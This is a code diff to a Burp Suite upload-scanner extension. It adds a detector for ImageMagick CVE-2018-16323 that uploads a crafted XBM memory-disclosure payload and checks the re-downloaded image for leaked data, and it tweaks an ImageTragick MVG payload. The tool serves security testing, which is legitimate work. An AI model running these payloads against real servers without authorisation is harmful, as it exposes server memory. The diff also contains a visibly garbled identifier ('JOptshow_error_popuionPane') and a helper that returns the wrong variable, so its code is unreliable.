@@ -98,6 +98,7 @@ import itertools  # for the fingerping module
 import threading  # to make stuff thread safe
 import pickle  # persisting object serialization between extension reloads
 import ast  # to parse ${PYTHONSTR:'abc\ndef'} into a python str
+from jarray import array  # to go from python list to Java array
 
 # Developer debug mode
 global DEBUG_MODE
@@ -308,6 +309,16 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             # ('', '.jpeg', 'image/jpeg'),
             ('mvg:', '.mvg', ''),
             # ('mvg:', '.mvg', 'image/svg+xml'),
+        }
+
+        # Xbm black/white pictures
+        self.XBM_TYPES = {
+            # ('', '', ''),
+            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+            ('', '.xbm', ''),
+            ('', '.xbm', 'image/x-xbm'),
+            ('', '.xbm', 'image/png'),
+            ('xbm:', BurpExtender.MARKER_ORIG_EXT, ''),
         }
 
         # Ghostscript types
@@ -745,7 +756,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                        "you have to start Burp with a larger -Xmx argument. Other strategies might be starting a new " \
                        "Burp project, loading less extensions or processing less requests in general. Press 'OK' to " \
                        "unload the UploadScanner extension."
-            response = JOptionPane.showConfirmDialog(self._global_opts, full_msg, "Out of memory",
+            response = JOptshow_error_popuionPane.showConfirmDialog(self._global_opts, full_msg, "Out of memory",
                                                      JOptionPane.OK_CANCEL_OPTION)
             if response == JOptionPane.OK_OPTION:
                 self._callbacks.unloadExtension()
@@ -790,8 +801,8 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 request_content = textwrap.fill(repr(FloydsHelpers.jb2ps(brr.getRequest())), 100)
                 print request_content
 
-                if len(request_content) > 1500:
-                    request_content = request_content[:1500] + "..."
+                if len(request_content) > 1000:
+                    request_content = request_content[:1000] + "..."
                 request_msg += request_content
                 response = JOptionPane.showConfirmDialog(self._global_opts, request_msg, request_msg,
                                                          JOptionPane.YES_NO_OPTION)
@@ -803,7 +814,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 if Desktop.isDesktopSupported():
                     desktop = Desktop.getDesktop()
                     if desktop.isSupported(Desktop.Action.BROWSE):
-                        github = "https://github.com/modzero/mod0BurpUploadScanner/issues/new?title=UploadScanner%20bug" \
+                        github = "https://github.com/modzero/mod0BurpUploadScanner/issues/new?title=Bug" \
                                  "&body=" + urllib.quote("```\n" + error_details + "\n```")
                         desktop.browse(URI(github))
                     #if desktop.isSupported(Desktop.Action.MAIL):
@@ -998,7 +1009,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             else:
                 return []
         except:
-            self.show_error_popup(traceback.format_exc(), "doActiveScan", base_request_response)
+            self.show_error_popup(traceback.format_exc(), "BurpExtender.getInsertionPoints", base_request_response)
             raise sys.exc_info()[1], None, sys.exc_info()[2]
 
     def run_flexiinjector(self, base_request_response, options=None):
@@ -1055,7 +1066,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 colab_tests.extend(self._imagetragick_cve_2016_3714_rce(injector, burp_colab))
                 self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
                 self._imagetragick_cve_2016_3714_sleep(injector)
-                
+                self._bad_manners_cve_2018_16323(injector)
             # Magick (ImageMagick and GraphicsMagick) - generic, as these are exploiting features
             if injector.opts.modules['magick'].isSelected():
                 print "\nDoing Image-/GraphicsMagick checks"
@@ -1252,7 +1263,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
               'y="0" height="{}px" width="{}px"/></svg>'
         mvg = "push graphic-context\n" \
               "viewbox 0 0 {} {}\n" \
-              "fill 'url(" + BurpExtender.MARKER_CACHE_DEFEAT_URL + "\";{} \"{}{})'\n" \
+              "fill 'url(" + BurpExtender.MARKER_CACHE_DEFEAT_URL + "\";{} {}\"{})'\n" \
               "pop graphic-context"
         filename = self.FILE_START + "ImDelay"
 
@@ -1267,6 +1278,88 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 self._send_sleep_based(injector, filename + "Svg" + cmd_name, content_svg, self.IM_SVG_TYPES, injector.opts.sleep_time, issue)
 
         return []
+
+    def _bad_manners_cve_2018_16323(self, injector):
+        if not injector.opts.redl_enabled or not injector.opts.redl_configured:
+            # this module can only find leaks in images when the files are downloaded again
+            return
+        # CVE-2018-16323, see https://github.com/ttffdd/XBadManners
+        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "BadManners"
+        content = Xbm("".join(random.sample(string.ascii_letters, 5))).create_xbm(injector.opts.image_width,
+                                   injector.opts.image_height)
+        urrs = self._send_simple(injector, self.XBM_TYPES, basename, content, redownload=True)
+        for urr in urrs:
+            if urr and urr.download_rr:
+                resp = urr.download_rr.getResponse()
+                if resp:
+                    resp = FloydsHelpers.jb2ps(resp)
+                    i_response_info = self._helpers.analyzeResponse(urr.download_rr.getResponse())
+                    body_offset = i_response_info.getBodyOffset()
+                    body = resp[body_offset:]
+                    picture_width, picture_height, fileformat = ImageHelpers.image_width_height(body)
+                    if picture_width and picture_height and fileformat:
+                        has_been_resized = False
+                        if picture_width >= 200 or picture_height >= 200:
+                            # We first resize the picture to a small one so we don't have to check
+                            # too many pixels (performance)...
+                            thumbnail = ImageHelpers.rescale_image(200, 200, body)
+                            if thumbnail:  # only if body was an image that ImageIO can parse
+                                # Now get the pixels of the picture
+                                body = thumbnail
+                                has_been_resized = True
+                                picture_width = 200
+                                picture_height = 200
+                        rgbs = ImageHelpers.get_image_rgb_list(body)
+                        # As we send a first byte that is not white,
+                        # let's ignore the first few pixels... (that's what a non-vulnerable imagemagick turns black)
+                        for i in range(0, picture_width/4):
+                            rgbs[i] = -1
+                        body = ImageHelpers.get_image_from_rgb_list(picture_width, picture_height, fileformat, rgbs)
+                        white = rgbs.count(-1)
+                        # When doing "convert in.xbm out.png", the resulting PNG has only -16777216 as black...
+                        black = 0
+                        black_rgb_values = [-16777216]
+                        # But with "convert in.xbm -size widthxheight out.jpeg", the resulting JPEG has as well others
+                        # which are black pixels turned into gray values
+                        # so this is not super accurate, but it doesn't matter too much, because the real false positive
+                        # will be decided with is_grayscale
+                        black_rgb_values.extend([-263173, -197380, -131587, -65794, -131587, -12434878, -657931,
+                                                 -855310, -394759, -592138, -526345, -328966, -986896, -460552])
+                        for value in black_rgb_values:
+                            black += rgbs.count(value)
+                        other = len(rgbs) - white - black
+                        examples = [x for x in rgbs if x != -1 and x not in black_rgb_values]
+                        other_examples = set(examples[:50])
+                        if white < picture_width * picture_height:
+                            # We uploaded a white picture, but we got something with not only white pixels
+                            if ImageHelpers.is_grayscale(body):
+                                # When it was resized, and it is only grayscale, then this could really be a true positive
+                                # Black pixels often go gray when an image is resized (on the server side or here what we
+                                # just did for performance reason) to a smaller size
+                                name = "Bad Manners (CVE-2018-16323)"
+                                severity = "High"
+                                if other > 0:
+                                    confidence = "Tentative"
+                                else:
+                                    confidence = "Firm"
+                                detail = "The server might use a vulnerable version of Imagemagick. It is vulnerable to " \
+                                     "CVE-2018-16323, see https://github.com/ttffdd/XBadManners. We uploaded a " \
+                                     "fully white XBM file format picture (black and white format) with a known memory " \
+                                     "disclosure payload and the server sent back an image that has not only white pixels. " \
+                                     "This could also just mean that the server adds other colors to our picture, which is " \
+                                     "countered by checking that the image is only grayscale. The image returned was only " \
+                                     "grayscale. However, if the server modifies white picture to include gray or black " \
+                                     "pixels this could still be a false positive. Please verify manually. <br>" \
+                                     "Number of white pixels: {} <br>" \
+                                     "Number of black/gray pixels (estimation): {} <br>" \
+                                     "Number of other pixels (estimation): {} <br>" \
+                                     "First 50 other pixel RGB integer values: <br>" \
+                                     "{}".format(white, black, other, other_examples)
+                                issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
+                                issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
+                                self._add_scan_issue(issue)
+                            #else:
+                                #print "Although we uploaded a white XBM picture, the server returned a non-grayscale picture..."
 
     def _imagetragick_cve_2016_3714_rce(self, injector, burp_colab):
         colab_tests = []
@@ -4417,6 +4510,152 @@ class FloydsHelpers(object):
                 return ""
         return ""
 
+class ImageHelpers(object):
+    # As Python Pillow uses Python native C extensions and as Jython doesn't support that (yet)
+    # we can not simply make Python pillow a dependency.
+    # Pillow solution was simply:
+    # img = Image.open(BytesIO(content))
+    # img = img.resize(size)
+    # content = BytesIO()
+    # img.save(content, format=ext[1:])
+    # content.seek(0)
+    # content = content.read()
+
+    # Therefore going the Java way here.
+    # But then we also don't want to use external libraries for Java, so we have to stick with
+    # ImageIO. But ImageIO only supports tiff from JDK 1.9 onwards... a little messy
+    @staticmethod
+    def get_imageio(content):
+        try:
+            input_stream = ByteArrayInputStream(content)
+            io = ImageIO.read(input_stream)
+            if io: #  ImageIO returns None if the file couldn't be parse (eg. tiff for JDK < 1.9)
+                # Now also determine if this is a png, jpeg, tiff or whatever:
+                readers = ImageIO.getImageReaders(ImageIO.createImageInputStream(ByteArrayInputStream(content)))
+                if readers.hasNext():
+                    fileformat = readers.next().getFormatName()
+                    return io, fileformat
+                else:
+                    print "Exception in get_imageio, ImageIO seems to be able to read an image but not get a ImageReader for it"
+            else:
+                # print "Not a valid image in get_imageio"
+                pass
+        except Exception, e:
+            print "Couldn't do get_imageio"
+            print e
+        return None, None
+
+    @staticmethod
+    def image_width_height(content):
+        try:
+            io, fileformat = ImageHelpers.get_imageio(content)
+            if io:
+                return io.getWidth(), io.getHeight(), fileformat
+        except Exception, e:
+            print "Couldn't do image_width_height"
+            print e
+        return None, None, None
+
+    @staticmethod
+    def rescale_image(width, height, content):
+        output = ""
+        try:
+            io, fileformat = ImageHelpers.get_imageio(content)
+            if io and fileformat:
+                scaled_image = BufferedImage(width, height, BufferedImage.TYPE_INT_RGB)
+                graphics2D = scaled_image.createGraphics()
+                #If we would need better quality...
+                #graphics2D.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR)
+                #graphics2D.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY)
+                #graphics2D.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON)
+                graphics2D.drawImage(io, 0, 0, width, height, None)
+                graphics2D.dispose()
+                output_stream = ByteArrayOutputStream()
+                ImageIO.write(scaled_image, fileformat, output_stream)
+                output = FloydsHelpers.jb2ps(output_stream.toByteArray())
+            else:
+                # print "Not a valid image in rescale_image"
+                pass
+        except Exception, e:
+            print "Exception in rescale_image called with {} {} {}, but simply ignoring and going on".format(width, height, repr(content[:100]))
+            print e
+        return output
+
+    @staticmethod
+    def get_image_rgb_list(content):
+        output = []
+        try:
+            io, fileformat = ImageHelpers.get_imageio(content)
+            if io and fileformat:
+                width = io.getWidth()
+                heigth = io.getHeight()
+                output = io.getRGB(0, 0, width, heigth, None, 0, width)
+                # turn Java array into list..
+                output = [x for x in output]
+        except Exception, e:
+            print "Exception in get_image_rgb_list called with {}, but simply ignoring and going on".format(repr(content[:100]))
+            print e
+        return output
+
+    @staticmethod
+    def get_image_from_rgb_list(width, height, type_ext, rgbs):
+        content = ""
+        try:
+            img = BufferedImage(width, height, BufferedImage.TYPE_INT_RGB)
+            img.getRaster().setDataElements(0, 0, width, height, array(rgbs,'i'))
+            output_stream = ByteArrayOutputStream()
+            ImageIO.write(img, type_ext, output_stream)
+            output = FloydsHelpers.jb2ps(output_stream.toByteArray())
+        except Exception, e:
+            print "Exception in get_image_from_rgb_list called with {}, but simply ignoring and going on".format(repr(rgbs[:100]))
+            print e
+        return output
+
+    @staticmethod
+    def is_grayscale(content):
+        all_grayscale = True
+        try:
+            io, fileformat = ImageHelpers.get_imageio(content)
+            if io and fileformat:
+                ras = io.getRaster()
+                elem = ras.getNumDataElements()
+                width = io.getWidth()
+                height = io.getHeight()
+                for i in range(0, width):
+                    for j in range(0, height):
+                        pixel = io.getRGB(i, j)
+                        red = (pixel >> 16) & 0xff
+                        green = (pixel >> 8) & 0xff
+                        blue = (pixel) & 0xff
+                        if red != green or green != blue:
+                            all_grayscale = False
+                            break
+                    if not all_grayscale:
+                        break
+        except Exception, e:
+            print "Exception in is_grayscale called with {}, but simply ignoring and going on".format(repr(content[:100]))
+            print e
+        return all_grayscale
+
+
+    @staticmethod
+    def new_image(width, height, type_ext):
+        output = ""
+        try:
+            color = random.randint(1, 2147483600)
+            buffered_image = BufferedImage(width, height, BufferedImage.TYPE_INT_RGB)
+            g2d = buffered_image.createGraphics()
+            g2d.setColor(Color(color))
+            g2d.fillRect(0, 0, width, height)
+
+            output_stream = ByteArrayOutputStream()
+            ImageIO.write(buffered_image, type_ext, output_stream)
+            output = FloydsHelpers.jb2ps(output_stream.toByteArray())
+        except Exception, e:
+            print "Exception in new_image called with {} {} {}, but simply ignoring and going on".format(width, height, type_ext)
+            print e
+        return output
+
 
 class StopScanException(Exception):
     pass
@@ -4985,7 +5224,7 @@ class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
                             insertion_points.append(InsertionPointForActiveScan(injector, upload_type, function, args, kwargs))
                 # TODO: How about we also try to download the files we created InsertionPoints payloads for...?
         except:
-            self.burp_extender.show_error_popup(traceback.format_exc(), "getInsertionPoints", base_request_response)
+            self.burp_extender.show_error_popup(traceback.format_exc(), "InsertionPointProviderForActiveScan.getInsertionPoints", base_request_response)
             raise sys.exc_info()[1], None, sys.exc_info()[2]
         return insertion_points
 
@@ -5476,57 +5715,6 @@ class BackdooredFile:
                 self._exiftool_works = False
         return self._exiftool_works
 
-    def _resize_and_color_image(self, size, ext, content):
-        # As Python Pillow uses Python native C extensions and as Jython doesn't support that (yet)
-        # we can not simply make Python pillow a dependency.
-        # Pillow solution was simply:
-        # img = Image.open(BytesIO(content))
-        # img = img.resize(size)
-        # content = BytesIO()
-        # img.save(content, format=ext[1:])
-        # content.seek(0)
-        # content = content.read()
-
-        # Therefore going the ugly Java way here.
-        # But then we also don't want to use external libraries for Java, so we have to stick with
-        # ImageIO. But ImageIO only supports tiff from JDK 1.9 onwards... a little messy
-        output = ""
-        try:
-            inputStream = ByteArrayInputStream(content)
-            i = ImageIO.read(inputStream)
-            if i:  # ImageIO returns None if the file couldn't be parse (eg. tiff for JDK < 1.9)
-                thumbnail = i.getScaledInstance(size[0], size[1], Image.SCALE_FAST)
-                # TODO: Basically here we throw all the content away and just generate a new image with the right
-                # sizes, so in most cases, passing content to this function is pointless. Once tiff is supported
-                # in Java, remove all those hard coded small images maybe? Although there is this once techniquey
-                # in the tiff file...
-                buffered_image = BufferedImage(thumbnail.getWidth(None), thumbnail.getHeight(None),
-                                                  BufferedImage.TYPE_INT_RGB)
-                g = buffered_image.getGraphics()
-                # Color the picture in a random color. We do this so we can nicely see in Burp rendering that
-                # the color changes during the uploads for every file type
-                # This used to be up to 0xFFFFFFFE, but then we get:
-                # setRGB(): 3rd arg can't be coerced to int, probably because Java's MAX_INT
-                # is 2147483647. As explained here: https://stackoverflow.com/questions/6001211/format-of-type-int-rgb-and-type-int-argb#6001276
-                color = random.randint(1, 2147483600)
-                for w in range(0, min(size[0], 100)):
-                    for h in range(0, min(size[1], 100)):
-                        buffered_image.setRGB(int(w), int(h), int(color))
-
-                output_stream = ByteArrayOutputStream()
-                # m, output_path = tempfile.mkstemp(suffix=ext)
-                # os.close(m)
-                # os.remove(output_path)
-                # filepath = File(output_path)
-                # output_stream = FileOutputStream(filepath)
-                ImageIO.write(buffered_image, ext[1:], output_stream)
-                # output = file(output_path, "rb").read()
-                # os.remove(output_path)
-                output = FloydsHelpers.jb2ps(output_stream.toByteArray())
-        except Exception, e:
-            print "Exception in _resize_and_color_image, but simply ignoring and going on:", e
-        return output
-
     def get_zip_files(self, payload_func, techniques=None):
         if not techniques or "content" in techniques:
             payload, expect = payload_func()
@@ -5578,7 +5766,7 @@ class BackdooredFile:
             # then convert it to a PDF so the PDF has the right size?
             # If not: use a larger default pdf
             if not ext == ".pdf" and not ext == ".mp4":
-                x = self._resize_and_color_image(size, ext, content)
+                x = ImageHelpers.new_image(size[0], size[1], ext[1:])
                 if x:
                     content = x
                 else:
@@ -5660,8 +5848,8 @@ class BackdooredFile:
                                 yield payload, expect, name, ext, c
                         else:
                             print "Warning: Payload missing. IPTC:Keywords has length limit of 64. " \
-                                  "Technique: {}, File type: {}, Payload length: {}" \
-                                  "".format(name, ext, len(payload_placeholder))
+                                  "Technique: {}, File type: {}, Payload length: {}, Payload start: {}" \
+                                  "".format(name, ext, len(payload_placeholder), repr(payload[:100]))
                             # print "Content:", repr(new_content)
                     else:
                         print "Error: The following image could not be created (exiftool didn't create a file):", name, ext
@@ -6187,6 +6375,33 @@ class XxeOfficeDoc(Xxe):
             if ".xlsx" in formats:
                 yield techniques[name][-1][-1], name + filenames_desc, ".xlsx", self._create_xlsx(techniques[name],
                                                                                                   filenames=filenames)
+
+
+class Xbm(object):
+
+    def __init__(self, name):
+        self.name = name
+
+    def create_xbm(self, width, height, bytes_per_line=12):
+        xbm = "#define {}_width {}\n".format(self.name, width)
+        xbm += "#define {}_height {}\n".format(self.name, height)
+        xbm += "static char {}_bits[] = {{\n".format(self.name)
+        no_of_bytes = (width * height) / 8
+        #xbm += "  0x80000001, " #  the value causing the overflow, from orig PoC
+        xbm += "  0xffffffff, "
+        first_line = "0x00, " * (bytes_per_line - 1)
+        xbm += first_line + "\n"
+        no_of_bytes -= bytes_per_line
+        while no_of_bytes > 0:
+            bytes_this_line = min(bytes_per_line, no_of_bytes)
+            line = "0x00, " * bytes_this_line
+            xbm += "  " + line + "\n"
+            no_of_bytes -= bytes_this_line
+        xbm += "};\n"
+        return xbm
+
+
+
 
 
 class AviM3uXbin(object):
@@ -7816,7 +8031,7 @@ class CollaboratorMonitorThread(Thread):
             if self.saved_interactions_for_later:
                 if self.print_message_counter % 10 == 0:
                     print "Found Collaborator interactions where we didn't get the issue details yet, saving for later... " \
-                        "This message should be printed anymore after all scans are finished."  #, repr(self.saved_interactions_for_later.keys())
+                        "This message shouldn't be printed anymore after all scans are finished."  #, repr(self.saved_interactions_for_later.keys())
                 self.print_message_counter += 1
 
     def _get_interactions_as_str(self, interactions):
@@ -8220,8 +8435,8 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
         self.fi_filemime = ''
 
         # Options ImageFormating:
-        self.image_height = 800
-        self.image_width = 800
+        self.image_height = 200
+        self.image_width = 200
 
         if self._global_options:
             self.image_exiftool = "exiftool"
@@ -8486,7 +8701,7 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
         else:
             _, self.cb_show_modules = self.label_checkbox("Show modules used", False)
             self.module_labels['activescan'], self.modules['activescan'] = self.checkbox('Do Active Scan:', False)
-        self.module_labels['imagetragick'], self.modules['imagetragick'] = self.checkbox('ImageTragick:', True)
+        self.module_labels['imagetragick'], self.modules['imagetragick'] = self.checkbox('ImageTragick & Co. (CVE-based):', True)
         self.module_labels['magick'], self.modules['magick'] = self.checkbox('Image-/GraphicsMagick:', True)
         self.module_labels['gs'], self.modules['gs'] = self.checkbox('Ghostscript:', True)
         self.module_labels['libavformat'], self.modules['libavformat'] = self.checkbox('LibAVFormat (m3u, m3u in avi):', True)
